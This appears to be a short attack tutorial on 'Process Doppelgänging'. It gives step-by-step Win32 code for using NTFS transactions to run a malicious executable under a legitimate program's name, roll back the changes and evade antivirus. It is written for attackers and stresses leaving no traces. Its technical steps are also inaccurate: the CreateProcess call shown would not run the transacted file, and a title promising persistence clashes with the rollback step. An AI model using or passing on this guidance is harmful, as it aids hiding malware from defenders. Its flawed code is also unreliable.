### **ESTABLISHING PERSISTENCE USING PROCESS DOPPELGÄNGING**

Process Doppelgänging is a sophisticated technique that exploits Windows NTFS transactions to execute malicious code in the guise of legitimate processes. This method can evade detection from most antivirus software.

### **STEP 1: CREATE A NEW TRANSACTION**

1.  Ensure the target system uses NTFS: This technique specifically requires NTFS due to its transactional features.
    
2.  Acquire the necessary tools and permissions: Administrative privileges are typically required to execute this technique.
    
3.  Start a new NTFS transaction: Use the Windows API to begin a transaction, manipulating the filesystem without immediate permanent effect.  
    `HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);`
    

### **STEP 2: REPLACE A LEGITIMATE EXECUTABLE**

1.  Select a legitimate executable to replace: Choose an executable that is commonly run and has the necessary execution privileges.
    
2.  Create a transacted file with the same name as the legitimate executable:   
    `HANDLE hFile = CreateFileTransacted(L"[LegitimateExecutablePath]", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);`
    
3.  Write the malicious executable to the transacted file: Load your malicious executable into memory and write it to the opened file handle.  
    `WriteFile(hFile, [MaliciousExecutableData], [SizeOfData], &dwBytesWritten, NULL);`
    

### **STEP 3: EXECUTE THE MALICIOUS EXECUTABLE**

1.  Execute the transacted file: While the transaction is still open, execute the file. The system will run the malicious code thinking it is the legitimate program.  
    `STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi; CreateProcess(NULL, L"[LegitimateExecutablePath]", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);`

### **STEP 4: ROLLBACK THE TRANSACTION**

1.  Rollback the transaction: After execution, rollback the transaction to revert changes made to the filesystem. This step deletes the malicious executable, leaving no traces on the disk.  
    `RollbackTransaction(hTransaction);`

### **STEP 5: CLEANUP**

1.  Close handles and cleanup: Ensure all handles are closed and memory allocations are freed to prevent resource leaks.  
    `CloseHandle(hFile);`  
    `CloseHandle(hTransaction);`